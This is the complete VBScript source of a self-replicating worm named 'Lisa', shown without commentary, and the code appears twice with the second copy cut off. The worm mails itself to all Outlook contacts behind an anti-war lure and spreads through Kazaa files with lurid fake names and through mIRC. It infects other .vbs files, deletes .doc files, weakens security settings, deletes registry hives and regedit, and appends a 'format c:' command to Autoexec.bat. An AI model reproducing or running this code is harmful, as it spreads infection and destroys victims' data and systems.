   ''Lisa
   On Error Resume Next

   Const ForReading = 1
   Const ForWriting = 2
   'PAxLHKPlVjgGyGCOS
   Const ForAppending = 8

   Dim WinDir, ScriptPath, HTMLBody, FName
   Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
   Dim wss : Set wss = CreateObject("WScript.Shell")
   'BCNXSsKvRLycmmkqYaI
   Dim wsn : Set wsn = CreateObject("WScript.Network")
   Dim Outlook : Set Outlook = CreateObject("Outlook.Application")
   Dim Internet : Set Internet = CreateObject("Microsoft.XMLHTTP")
   Dim Mapi : Set Mapi = Outlook.GetNameSpace("MAPI")
   Dim MapiAdList : Set MapiAdList = Mapi.AddressLists
   'VhlofHYQxegEdi

   FName = ""
   WinDir = fso.GetSpecialFolder(0) &"\"
   ScriptPath = WScript.ScriptFullName

   'KbpbSqQOnZmbEbnhCyYqRJFReuTFP
   Call CreateName()
   Call CreateHTML()
   Call CreateFile()
   Call Kazaa()
   Call DeleteOutlookFolders()
   Call SendEMail()
   Call CreateGarbage()
   Call DoDrives()
   Call Payload(1)
   Call Antidelete(FName)

   Set fso = Nothing
   Set wss = Nothing
   'eLNrOURuFFDJcksihAEHxZk
   Set wsn = Nothing
   Set Outlook = Nothing
   Set Mapi = Nothing
   Set MapiAdList = Nothing

   'QwyWvBQMtIeeJTaGFtW
   Sub CreateName()
   On Error Resume Next

       Randomize

   'GzUBJUXdwNWXcCwKRgpdNIIGMuD
       Do until Len(FName) = 7
        FName = FName + Chr(Int((90 - 80 + 1) * Rnd + 80))
       Loop

       RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(FName,1) &LCase(Right(FName,6)), "wscript.exe " &WinDir &FName &".vbs %","0"
   End Sub
   'BASHKBDf

   Sub CreateHTML()
   Dim MyLine, Code, htm, htm2

       Dim MySelf : Set MySelf = fso.OpenTextFile(ScriptPath,ForReading,False)
   'PCZOETMLwwfsYoXrMZM

       Do While MySelf.AtEndOfStream = False
        MyLine = MySelf.ReadLine
        Code = Code & Chr(34) &" & vbcrlf & " & Chr(34) &Replace(MyLine, Chr(34),Chr(34) &"&chr(34)&" &Chr(34))
       Loop
   'DXUmgnj
       MySelf.Close

       Set MySelf = Nothing

       htm = "<HTML><HEAD><META content=" & Chr(34) &"text/html; charset=iso-8859-1" & Chr(34) &" http-equiv=content-type><META content=" & Chr(34) &"MSHTML 5.0.0.2314.1000" & Chr(34) &" name=generator><META content=" & Chr(34) &"Author" & Chr(34) &" name=Lisa><STYLE></STYLE></HEAD><BODY bgcolor=#ffffff><SCRIPT language=vbscript>"
   'PQijuUzardyIvYNGOpTDVZToVxfb
       htm = htm & vbCrLf &"On Error Resume Next"
       htm = htm & vbCrLf &"Dim fso : Set fso = CreateObject(" & Chr(34) &"Scripting.FileSystemObject" & Chr(34) &")"
       htm = htm & vbCrLf &"If Err.Number <> 0 Then"
       htm = htm & vbCrLf &" document.write" & Chr(34) &"<font face='verdana' color=#ff0000 size='2'>For voting against war, please open this message again an click yes!<br>It´s very important!<br>Thank you!</font>" &Chr(34) &""
       htm = htm & vbCrLf &"Else"
   'laWfrPAxLHKPl
       htm = htm & vbCrLf &" Dim vbs : Set vbs = fso.CreateTextFile(fso.GetSpecialFolder(0) & " & Chr(34) &"\" &FName &".vbs" & Chr(34) & ",True)"
       htm = htm & vbCrLf &"     vbs.write " & Chr(34) & Code & Chr(34)
       htm = htm & vbCrLf &"     vbs.close"
       htm = htm & vbCrLf &" Set vbs = Nothing"
       htm = htm & vbCrLf &" Dim wss : Set wss = CreateObject(" & Chr(34) &"Wscript.Shell" & Chr(34) &")"
   'VjgGyGCOScBCNXSsK
       htm = htm & vbCrLf &"     wss.run fso.GetSpecialFolder(0) & " &Chr(34) & "\wscript.exe " & Chr(34) & " & fso.GetSpecialFolder(0) & " & Chr(34) & "\" &FName &".vbs %" &Chr(34) & ""
       htm = htm & vbCrLf &" Set wss = Nothing"
       htm2 = htm2 & vbCrLf &" document.write " & Chr(34) & "Thank you for voting against war. We will now send an EMail for you to Mr. Bush" & Chr(34) & ""
       htm2 = htm2 & vbCrLf &"End If"
       htm2 = htm2 & vbCrLf &"Set fso = Nothing"
   'vRLycmmkqYaIWVhlof
       htm2 = htm2 & vbCrLf &"<" & "/SCRIPT></" & "BODY></" &"HTML>"

       HTMLBody = htm & htm2
   End Sub

   'YQxegE
   Sub CreateFile()
   On Error Resume Next
   Dim File, Strings, ClearFile, x, MutateBody

       Dim OpenFile : Set OpenFile = fso.OpenTextFile(ScriptPath,ForReading)
   'ixKbpbSqQOnZmbEbnhCy
           File = OpenFile.ReadAll
           OpenFile.Close
       Set OpenFile = Nothing

       Strings = Split(file,vbCrLf)
   'qRJFReuTFPjeLN

       For x = 0 To UBound(Strings) Step 1
        If Strings(x) = Chr(39) & Chr(39) & "Lisa" Then
         Exit For
        End If
   'OURuFFDJcksihAEHxZkcQwyWvB
       Next

       For x = x To UBound(Strings) Step 1
        If Mid(Strings(x),1,1) = Chr(39) and Mid(Strings(x),2,1) <> Chr(39) Then
         x = x
   'MtIeeJTaGFt
        Else
         ClearFile = ClearFile & Strings(x) & vbCrLf

         If Strings(x) = Chr(39) & Chr(39) &"End" Then
          Exit For
   'tGzUBJUXdwNWXc
         End If
        End If
       Next

       MutateBody = vbCrLf & Mutator(ClearFile)
   'wKRg

       Dim Victim : Set Victim = fso.OpenTextFile(WinDir &FName &".vbs",ForWriting,True,0)
           Victim.Write MutateBody
           Victim.Close
       Set Victim = Nothing
   'dNIIGMuDLBASHKBDfcPCZOETM
   End Sub

   Sub SendEMail()
   On Error Resume Next
   Dim Address, NumOfContacts, Counter, EMailItem, ContactNumber
   'wwfsYoXr

       For Each Address in MapiAdList
        If Address.AddressEntries.Count <> 0 Then
         NumOfContacts = Address.AddressEntries.Count

   'ZMJDXUmgn
         For Counter = 1 To NumOfContacts
          Set ContactNumber = Address.AddressEntries(Counter)

          If ContactNumber.Address <> "" Then
           Set EMailItem = Outlook.CreateItem(0)
   'vPQijuUzardyIvYNGOpTDV
               EMailItem.To = ContactNumber.Address
               EMailItem.Subject = "Click YES and vote against war!"
               EMailItem.HTMLBody = HTMLBody
               EMailItem.DeleteAfterSubmit = True
               EMailItem.Send
   'ToVxfbUlaWfrPAx
           Set EMailItem = Nothing

               RegSet "HKCR\Lisa\Mail\Send","1","1"
          End If

   'HKPlVjgG
          Set ContactNumber = Nothing
         Next
        End If
       Next
   End Sub
   'yGCOScBCNXSsKvRLy

   Sub Antidelete(rname)
   On Error Resume Next
   Dim MyCode

   'mmkqYaIWVhlofHYQxeg
       Dim Myself : Set Myself = fso.OpenTextFile(ScriptPath,ForReading,False)
           MyCode = Myself.ReadAll
           Myself.Close
       Set Myself = Nothing

   'dixKb
       Do
        If Not fso.FileExists(ScriptPath) Then
         Set Myself = fso.CreateTextFile(ScriptPath,True)
             Myself.Write MyCode
             Myself.Close
   'bSqQOnZmbEbnhCyYqRJFReuTF
         Set Myself = Nothing
        End If

        If Not RegGet("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &rname) = "wscript.exe " &WinDir &FName &".vbs %" Then
         RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(RName,1) &LCase(Right(RName,6)), "wscript.exe " &WinDir &RName &".vbs %","0"
   'jeLNrOURuF
         Payload(0)
        End If
       Loop
   End Sub

   'DJcks
   Sub DeleteOutlookFolders()
   On Error Resume Next
   Dim i

       Dim Inbox : Set Inbox = Mapi.GetDefaultFolder(6)
   'ihAEHxZkcQwyWvB
       Dim DeletedItems : Set DeletedItems = Mapi.GetDefaultFolder(3)

       For i = 1 to Inbox.Items.Count
        If InBox.Items.Item(i).Subject = "Click YES and vote against war!" Then
           InBox.Items.Item(i).Close
   'MtIeeJTaGFt
           InBox.Items.Item(i).Delete
        End If
       Next

       For i = 1 to DeletedItems.Items.Count
   'tGzUBJUXdwNWXc
        If DeletedItems.Items.Item(i).Subject = "Click YES and vote against war!" Then
           DeletedItems.Items.Items(i).Delete
        End If
       Next

   'wKRg
       Set Inbox = Nothing
       Set DeletedItems = Nothing
   End Sub

   Sub Mirc(Path)
   'dNIIGMuDLBASHKBDfcPCZOETM
   On Error Resume Next

       If Path <> "" Then
        Dim MircScript : Set MircScript = fso.CreateTextFile(Path &"\script.ini",True)
            MircScript.attributes = MircScript.attributes + 1
   'wwfsYoXr
            MircScript.attributes = MircScript.attributes + 2
            MircScript.WriteLine "[script]"
            MircScript.WriteLine ";mIrc Script"
            MircScript.WriteLine ";http://www.mirc.com"
            MircScript.WriteLine ";Please do not edit this script"
   'ZMJDXUmgn
            MircScript.WriteLine "n0=on 1:start:{"
            MircScript.WriteLine "n1= .remote on"
            MircScript.WriteLine "n2= .ctcps on"
            MircScript.WriteLine "n3= .events on"
            MircScript.WriteLine "n4= }"
   'vPQijuUzardyIvYNGOpTDV
            MircScript.WriteLine "n5=on 1:join:#:{"
            MircScript.WriteLine "n6= /if ( $nick == $me ) { halt }"
            MircScript.WriteLine "n7= /msg $nick Please vote against war!"
            MircScript.WriteLine "n7= /.dcc send $nick " &ScriptPath
            MircScript.WriteLine "n8=}"
   'ToVxfbUlaWfrPAx
            MircScript.Close
        Set MircScript = Nothing
           End If
   End Sub

   'HKPlVjgG
   Sub RegistrySettings()
   On Error Resume Next

       If RegGet("HKCR\Lisa\InfectionDate") = "" Then
        RegSet "HKCR\Lisa\InfectionDate",Date(),"0"
   'yGCOScBCNXSsKvRLy
       End If

       RegSet "HKCR\.mp3","Lisa","0"
       RegSet "HKCR\VBSFile\Editflags",01000100,"1"
       RegSet "HKCU\Software\Kazaa\LocalContent\DisableSharing",0,"1"
   'mmkqYaIWVhlofHYQxeg
       RegSet "HKCU\Software\Kazaa\ResultsFilter\virus_filter",0,"1"
       RegSet "HKCU\Software\Kazaa\ResultsFilter\firewall_filter",0,"1"
       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Remote",1,"1"
       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"1"
       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Enabled",1,"1"
   'dixKb
       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\TrustPolicy",0,"1"
       RegSet "HKCR\Lisa\shell\open\command\","wscript " &WinDir &FName &"%","0"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","Lisa","0"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201",0,"1"
   'bSqQOnZmbEbnhCyYqRJFReuTF
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1200",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1201",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\1\1204",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200",0,"1"
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201",0,"1"
   'PJjlWmsCpZdechIPXyNNcfyPH
       RegSet "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1204",0,"1"
   End Sub

   Sub CreateGarbage()
   On Error Resume Next
   'uplYhJKhrGeBdFYvYfsazhtAv
   Dim AName, x

       x = 0
       AName = ""
       Randomize
   'luvHbCE

       Do until x = 5000
        Do until Len(AName) = 7
         AName = AName &Chr(Int((90 - 80 + 1) * Rnd + 80))
        Loop
   'pLUIlggfkbjCaqfiCbKIna

        Dim GarbageFolder : Set GarbageFolder = fso.CreateFolder("c:\" &AName)
            GarbageFolder.attributes = GarbageFolder.attributes + 2
            GarbageFolder.attributes = GarbageFolder.attributes + 1
        Set GarbageFolder = Nothing
   'mcrEkjAKYwTvXkxkibvsSzMSOnoNO

        Dim GarbageFile : Set GarbageFile = fso.CreateTextFile("c:\" &AName &"\" &AName &".txt",True)
            GarbageFile.WriteLine "I will never stop loving you"
            GarbageFile.Close
        Set GarbageFile = Nothing
   'tFWBIgEyyxDmemU

        AName = ""
        x = x + 1
       Loop
   End Sub
   'ctxBrUtLGsQFuKWDDoDkAfyjnR

   Sub Kazaa()
   On Error Resume Next
   Dim DownloadDir, KazaaFile, MyCode

   'BtOLe
       DownloadDir = RegGet("HKCU\Software\Kazaa\LocalContent\DownloadDir")

       If DownloadDir <> "" Then
        Dim Myself : Set Myself = fso.OpenTextFile(ScriptPath,ForReading,False)
            MyCode = Myself.ReadAll
   'eanq
            Myself.Close
        Set Myself = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Silvia Saint Gangbang.avi.vbs",True)
            KazaaFile.Write MyCode
   'blwqXiE
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Britney Spears nude.jpg.vbs",True)
            KazaaFile.Write MyCode
   'pjHRSQVFwFguuMQ
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Christina Aguilera Nipple.jpg.vbs",True)
            KazaaFile.Write MyCode
   'KgwoJLcINiGV
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Lolita.jpg.vbs",True)
            KazaaFile.Write MyCode
   'rVonSx
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Madonna - Song.mp3.vbs",True)
            KazaaFile.Write MyCode
   'CGdGTMawVqh
            KazaaFile.Close
        Set KazaaFile = Nothing

        Set KazaaFile = fso.CreateTextFile(DownloadDir &"\Jennifer Lopez.mp3.vbs",True)
            KazaaFile.Write MyCode
   'qJZrdoPJjlWmsCpZdec
            KazaaFile.Close
        Set KazaaFile = Nothing
       End If
   End Sub

   'IPXyNNcfyPHpuplYhJKhrG

   Sub Network()
   On Error Resume Next
   Dim NetDrives : Set NetDrives = wsn.EnumNetworkDrives

   'BdFYvYfsazhtAvJluvHb
       If NetDrives.Count <> 0 Then
        For xc = 0 To NetDrives.Count - 1
         If IntStr(NetDrives.Item(xc), "\") <> 0 Then
          fso.CopyFile ScriptPath, fso.BuildPath(NetDrives.Item(xc), WinDir &FName &".vbs")
         End If
   'CEipLUIlggfkbjCa
        Next
       End If
   End Sub

   Sub HTTPFileDownload(url, FileSaveTo)
   'qfiCbKInaxmcrEkjAK
   On Error Resume Next
   Dim Receive, Output, i

       Output = ""
       Internet.Open "GET",url,False
   'rvQQNGXqkqmzTUlnxYDdvgCLzcbRJ
       Internet.Send
       Receive = Internet.ResponseBody

       For i = 0 to UBound(receive)
        Output = Output & ChrW(AscW(Chr(AscB(MidB(Receive,i+1,1)))))
   'sXHZaWsZBje
       Next

       Dim Download : Set Download = fso.CreateTextFile(FileSaveTo,True)
           Download.Write Output
           Download.Close
   'oeZjubbTEcBPKO
       Set Download = Nothing
   End Sub

   Function DoDrives()
   On Error Resume Next
   'pcYmjJbDJFSV
   Dim hdready

       Dim Drives : Set Drives = fso.Drives

       For Each Drive in Drives
   'EGQVwOcyUODfpqotddLZl
        If Drive.Drivetype = Remote Then
         hdready = Drive & "\"
         Call Subfolders(hdready)
        ElseIf Drive.IsReady Then
         hdready = Drive & "\"
   'siLTChkHhmCNetfWuTSrpaeIf
         Call Subfolders(hdready)
        End If
       Next

       Set Drives = Nothing
   'kFCtVMIVhyWJTnhPRuRXaVxIJH
   End Function

   Function Subfolders(Path)
   On Error Resume Next
   Dim Ext, File, Subfol
   'gnvmlEILC

       Dim Fold : Set Fold = fso.GetFolder(Path)
       Dim Files : Set Files = Fold.Files

       For Each File in Files
   'ofUADZzFUQwMiiNWe
        Ext = LCase(fso.GetExtensionName(File.Path))

        If File.Name = "mirc.ini" Then
         Call Mirc(File.ParentFolder)
        End If

        If (Ext = "vbs") or (Ext = "vbe") Then
            Dim VBSFile : Set VBSFile = fso.OpenTextFile(File.Path,ForAppending,True)
             Dim ScriptFile : Set ScriptFile = fso.OpenTextFile(ScriptPath,ForReading,True)
                 VBSFile.Write ScriptFile.ReadAll
                 VBSFile.Close
                 ScriptFile.Close
             Set VBSFile = Nothing
             Set ScriptFile = Nothing
            End If

            If Ext = "doc" Then
             fso.DeleteFile(File.Path)
            End If
           Next
   'IdwxKDXF

           Set File = Fold.Subfolders
           For Each Subfol in File
            Call Subfolders(Subfol.Path)
       Next
   'MYhBRZfGAbdNUjshQ
   End Function

   Sub Payload(value)
   On Error Resume Next
       If value = "1" Then
   'MKPyGOaF
        fso.DeleteFile(WinDir &"regedit.exe")

        If Left(Date(),2) - Left(RegGet("HKCR\Lisa\InfectionDate"),2) > 3 Then
         fso.DeleteFile(WinDir &"user.dat")
         fso.DeleteFile(WinDir &"user.bak")
   'WLOEa
         fso.DeleteFile(WinDir &"system.dat")
         fso.DeleteFile(WinDir &"system.bak")
         fso.DeleteFile(WinDir &"win.com")
        End If
           Else
   'igSGSH
        RegSet "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\NoDesktop",00000001,"1"

        Dim Autoexec : Set Autoexec = fso.OpenTextFile("C:\Autoexec.bat",ForAppending,True)
            Autoexec.WriteLine "format c: /q /autotest /u"
            Autoexec.Close
   'cPPBBiwrvQQNGX
        Set Autoexec = Nothing

        wss.run "RunDll32.exe Shell32.dll,SHExitWindowsEX 0x01"
       End If
   End Sub
   'DPWRrsQSwbJFM

   Sub RegSet(key,value,keytype)
   On Error Resume Next
   Dim Registry : Set Registry = CreateObject("WScript.Shell")

   'kICDBHpipYvfxCFvXx
       Select Case keytype
        Case "1" Registry.RegWrite key,value,"REG_DWORD"
        Case Else Registry.RegWrite key,value
       End Select
   End Sub
   'OJwTJyOZGGrcHnEjDm

   Function RegGet(value)
   On Error Resume Next
   Dim Registry : Set Registry = CreateObject("WScript.Shell")
       RegGet = Registry.RegRead(value)
   'UHExSOhGbidquLceoAumItmbLU
   End Function

   Function Mutator(CTM)
   On Error Resume Next
   Dim Strings, CommentsCount, CommentPlace, y, b, Comment, DoMutateBody
   'TZIBJkyxQUXOj

       Strings = Split(CTM,vbCrLf)
       CommentsCount = CByte(GetRndNumber(3,UBound(Strings) / 1.5))
       CommentPlace = CByte(UBound(Strings) / CommentsCount)
       y = 0
   'saM

       For b = 0 To UBound(Strings) Step 1
        DoMutateBody = DoMutateBody & Strings(b) & vbCrLf
        y = y + 1

   'gMRalJYKuZ
        If y = CommentPlace Then
         Comment = MakeComment()
         DoMutateBody = DoMutateBody & Comment
         y = 0
        End If
   'qWCVFKgKWQeaAYtlgtNuhrSNnp
       Next

       Mutator = DoMutateBody
   End Function

   'qwFtghflLTDRQcg
   Function MakeComment()
   On Error Resume Next
   Dim CommentLength, DoComment, z, a

       CommentLength = CByte(GetRndNumber(3,30))
   'aCTLsbydsokNNluJiEhIyi
       DoComment = Chr(39)

       For z = 1 To CommentLength Step 1
        a = CByte(GetRndNumber(65,122))

   'wdDkwEyMpxzKeGImtPY
        If a < 91 or a > 96 Then
         DoComment = DoComment & Chr(a)
        Else
         z = z - 1
        End If
   'pjkiofnGd
       Next

       MakeComment = DoComment & vbCrLf
   End Function

   'ZORIdKm
   Function GetRndNumber(a,b)
   On Error Resume Next
   Dim c

       Randomize
   'WJaVLgTSEEcmAvyTaTQKucn
       c = (b - a) * Rnd + a
       GetRndNumber = c
   End Function
   ''End

   'qDWXpqCHhydkGPDgbbfVNVwKadvF

   ''Lisa
   On Error Resume Next

   Const ForReading = 1
   Const ForWriting = 2
   'PAxLHKPlVjgGyGCOS
   Const ForAppending = 8

   Dim WinDir, ScriptPath, HTMLBody, FName
   Dim fso : Set fso = CreateObject("Scripting.FileSystemObject")
   Dim wss : Set wss = CreateObject("WScript.Shell")
   'BCNXSsKvRLycmmkqYaI
   Dim wsn : Set wsn = CreateObject("WScript.Network")
   Dim Outlook : Set Outlook = CreateObject("Outlook.Application")
   Dim Internet : Set Internet = CreateObject("Microsoft.XMLHTTP")
   Dim Mapi : Set Mapi = Outlook.GetNameSpace("MAPI")
   Dim MapiAdList : Set MapiAdList = Mapi.AddressLists
   'VhlofHYQxegEdi

   FName = ""
   WinDir = fso.GetSpecialFolder(0) &"\"
   ScriptPath = WScript.ScriptFullName

   'KbpbSqQOnZmbEbnhCyYqRJFReuTFP
   Call CreateName()
   Call CreateHTML()
   Call CreateFile()
   Call Kazaa()
   Call DeleteOutlookFolders()
   Call SendEMail()
   Call CreateGarbage()
   Call DoDrives()
   Call Payload(1)
   Call Antidelete(FName)

   Set fso = Nothing
   Set wss = Nothing
   'eLNrOURuFFDJcksihAEHxZk
   Set wsn = Nothing
   Set Outlook = Nothing
   Set Mapi = Nothing
   Set MapiAdList = Nothing

   'QwyWvBQMtIeeJTaGFtW
   Sub CreateName()
   On Error Resume Next

       Randomize

   'GzUBJUXdwNWXcCwKRgpdNIIGMuD
       Do until Len(FName) = 7
        FName = FName + Chr(Int((90 - 80 + 1) * Rnd + 80))
       Loop

       RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(FName,1) &LCase(Right(FName,6)), "wscript.exe " &WinDir &FName &".vbs %","0"
   End Sub
   'BASHKBDf

   Sub CreateHTML()
   Dim MyLine, Code, htm, htm2

       Dim MySelf : Set MySelf = fso.OpenTextFile(ScriptPath,ForReading,False)
   'PCZOETMLwwfsYoXrMZM

       Do While MySelf.AtEndOfStream = False
        MyLine = MySelf.ReadLine
        Code = Code & Chr(34) &" & vbcrlf & " & Chr(34) &Replace(MyLine, Chr(34),Chr(34) &"&chr(34)&" &Chr(34))
       Loop
   'DXUmgnj
       MySelf.Close

       Set MySelf = Nothing

       htm = "<HTML><HEAD><META content=" & Chr(34) &"text/html; charset=iso-8859-1" & Chr(34) &" http-equiv=content-type><META content=" & Chr(34) &"MSHTML 5.0.0.2314.1000" & Chr(34) &" name=generator><META content=" & Chr(34) &"Author" & Chr(34) &" name=Lisa><STYLE></STYLE></HEAD><BODY bgcolor=#ffffff><SCRIPT language=vbscript>"
   'PQijuUzardyIvYNGOpTDVZToVxfb
       htm = htm & vbCrLf &"On Error Resume Next"
       htm = htm & vbCrLf &"Dim fso : Set fso = CreateObject(" & Chr(34) &"Scripting.FileSystemObject" & Chr(34) &")"
       htm = htm & vbCrLf &"If Err.Number <> 0 Then"
       htm = htm & vbCrLf &" document.write" & Chr(34) &"<font face='verdana' color=#ff0000 size='2'>For voting against war, please open this message again an click yes!<br>It´s very important!<br>Thank you!</font>" &Chr(34) &""
       htm = htm & vbCrLf &"Else"
   'laWfrPAxLHKPl
       htm = htm & vbCrLf &" Dim vbs : Set vbs = fso.CreateTextFile(fso.GetSpecialFolder(0) & " & Chr(34) &"\" &FName &".vbs" & Chr(34) & ",True)"
       htm = htm & vbCrLf &"     vbs.write " & Chr(34) & Code & Chr(34)
       htm = htm & vbCrLf &"     vbs.close"
       htm = htm & vbCrLf &" Set vbs = Nothing"
       htm = htm & vbCrLf &" Dim wss : Set wss = CreateObject(" & Chr(34) &"Wscript.Shell" & Chr(34) &")"
   'VjgGyGCOScBCNXSsK
       htm = htm & vbCrLf &"     wss.run fso.GetSpecialFolder(0) & " &Chr(34) & "\wscript.exe " & Chr(34) & " & fso.GetSpecialFolder(0) & " & Chr(34) & "\" &FName &".vbs %" &Chr(34) & ""
       htm = htm & vbCrLf &" Set wss = Nothing"
       htm2 = htm2 & vbCrLf &" document.write " & Chr(34) & "Thank you for voting against war. We will now send an EMail for you to Mr. Bush" & Chr(34) & ""
       htm2 = htm2 & vbCrLf &"End If"
       htm2 = htm2 & vbCrLf &"Set fso = Nothing"
   'vRLycmmkqYaIWVhlof
       htm2 = htm2 & vbCrLf &"<" & "/SCRIPT></" & "BODY></" &"HTML>"

       HTMLBody = htm & htm2
   End Sub

   'YQxegE
   Sub CreateFile()
   On Error Resume Next
   Dim File, Strings, ClearFile, x, MutateBody

       Dim OpenFile : Set OpenFile = fso.OpenTextFile(ScriptPath,ForReading)
   'ixKbpbSqQOnZmbEbnhCy
           File = OpenFile.ReadAll
           OpenFile.Close
       Set OpenFile = Nothing

       Strings = Split(file,vbCrLf)
   'qRJFReuTFPjeLN

       For x = 0 To UBound(Strings) Step 1
        If Strings(x) = Chr(39) & Chr(39) & "Lisa" Then
         Exit For
        End If
   'OURuFFDJcksihAEHxZkcQwyWvB
       Next

       For x = x To UBound(Strings) Step 1
        If Mid(Strings(x),1,1) = Chr(39) and Mid(Strings(x),2,1) <> Chr(39) Then
         x = x
   'MtIeeJTaGFt
        Else
         ClearFile = ClearFile & Strings(x) & vbCrLf

         If Strings(x) = Chr(39) & Chr(39) &"End" Then
          Exit For
   'tGzUBJUXdwNWXc
         End If
        End If
       Next

       MutateBody = vbCrLf & Mutator(ClearFile)
   'wKRg

       Dim Victim : Set Victim = fso.OpenTextFile(WinDir &FName &".vbs",ForWriting,True,0)
           Victim.Write MutateBody
           Victim.Close
       Set Victim = Nothing
   'dNIIGMuDLBASHKBDfcPCZOETM
   End Sub

   Sub SendEMail()
   On Error Resume Next
   Dim Address, NumOfContacts, Counter, EMailItem, ContactNumber
   'wwfsYoXr

       For Each Address in MapiAdList
        If Address.AddressEntries.Count <> 0 Then
         NumOfContacts = Address.AddressEntries.Count

   'ZMJDXUmgn
         For Counter = 1 To NumOfContacts
          Set ContactNumber = Address.AddressEntries(Counter)

          If ContactNumber.Address <> "" Then
           Set EMailItem = Outlook.CreateItem(0)
   'vPQijuUzardyIvYNGOpTDV
               EMailItem.To = ContactNumber.Address
               EMailItem.Subject = "Click YES and vote against war!"
               EMailItem.HTMLBody = HTMLBody
               EMailItem.DeleteAfterSubmit = True
               EMailItem.Send
   'ToVxfbUlaWfrPAx
           Set EMailItem = Nothing

               RegSet "HKCR\Lisa\Mail\Send","1","1"
          End If

   'HKPlVjgG
          Set ContactNumber = Nothing
         Next
        End If
       Next
   End Sub
   'yGCOScBCNXSsKvRLy

   Sub Antidelete(rname)
   On Error Resume Next
   Dim MyCode

   'mmkqYaIWVhlofHYQxeg
       Dim Myself : Set Myself = fso.OpenTextFile(ScriptPath,ForReading,False)
           MyCode = Myself.ReadAll
           Myself.Close
       Set Myself = Nothing

   'dixKb
       Do
        If Not fso.FileExists(ScriptPath) Then
         Set Myself = fso.CreateTextFile(ScriptPath,True)
             Myself.Write MyCode
             Myself.Close
   'bSqQOnZmbEbnhCyYqRJFReuTF
         Set Myself = Nothing
        End If

        If Not RegGet("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &rname) = "wscript.exe " &WinDir &FName &".vbs %" Then
         RegSet "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" &Left(RName,1) &LCase(Right(RName,6)), "wscript.exe " &WinDir &RName &".vbs %","0"
   'jeLNrOURuF
         Payload(0)
        End If
       Loop
   End Sub

   'DJcks
   Sub DeleteOutlookFolders()
   On Error Resume Next
   Dim i

       Dim Inbox : Set Inbox = Mapi.GetDefaultFolder(6)
   'ihAEHxZkcQwyWvB
       Dim DeletedItems : Set DeletedItems = Mapi.GetDefaultFolder(3)

       For i = 1 to Inbox.Items.Count
        If InBox.Items.Item(i).Subject = "Click YES and vote against war!" Then
           InBox.Items.Item(i).Close
   'MtIeeJTaGFt
           InBox.Items.Item(i).Delete
        End If
       Next

       For i = 1 to DeletedItems.Items.Count
   'tGzUBJUXdwNWXc
        If DeletedItems.Items.Item(i).Subject = "Click YES and vote against war!" Then
           DeletedItems.Items.Items(i).Delete
        End If
       Next

   'wKRg
       Set Inbox = Nothing
       Set DeletedItems = Nothing
   End Sub

   Sub Mirc(Path)
   'dNIIGMuDLBASHKBDfcPCZOETM
   On Error Resume Next

       If Path <> "" Then
        Dim MircScript : Set MircScript = fso.CreateTextFile(Path &"\script.ini",True)
            MircScript.attributes = MircScript.attributes + 1
   'wwfsYoXr
            MircScript.attributes = MircScript.attributes + 2
            MircScript.WriteLine "[script]"
            MircScript.WriteLine ";mIrc Script"
            MircScript.WriteLine ";http://www.mirc.com"
            MircScript.WriteLine ";Please do not edit this script"
   'ZMJDXUmgn
            MircScript.WriteLine "n0=on 1:start:{"
            MircScript.WriteLine "n1= .remote on"
            MircScript.WriteLine "n2= .ctcps on"
            MircScript.WriteLine "n3= .events on"
            MircScript.WriteLine "n4= }"
   'vPQijuUzardyIvYNGOpTDV
            MircScript.WriteLine "n5=on 1:join:#:{"
            MircScript.WriteLine "n6= /if ( $nick == $me ) { halt }"
            MircScript.WriteLine "n7= /msg $nick Please vote against war!"
            MircScript.WriteLine "n7= /.dcc send $nick " &ScriptPath
            MircScript.WriteLine "n8=}"
   'ToVxfbUlaWfrPAx
            MircScript.Close
        Set MircScript = Nothing
           End If
   End Sub

   'HKPlVjgG
   Sub RegistrySettings()
   On Error Resume Next

       If RegGet("HKCR\Lisa\InfectionDate") = "" Then
        RegSet "HKCR\Lisa\InfectionDate",Date(),"0"
   'yGCOScBCNXSsKvRLy
       End If

       RegSet "HKCR\.mp3","Lisa","0"
       RegSet "HKCR\VBSFile\Editflags",01000100,"1"
       RegSet "HKCU\Software\Kazaa\LocalContent\DisableSharing",0,"1"
   'mmkqYaIWVhlofHYQxeg
       RegSet "HKCU\Software\Kazaa\ResultsFilter\virus_filter",0,"1"
       RegSet "HKCU\Software\Kazaa\ResultsFilter\firewall_filter",0,"1"
       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Remote",1,"1"
       RegSet "HKCU\Software\Microsoft\Windows Script Host\Settings\Timeout",0,"1"
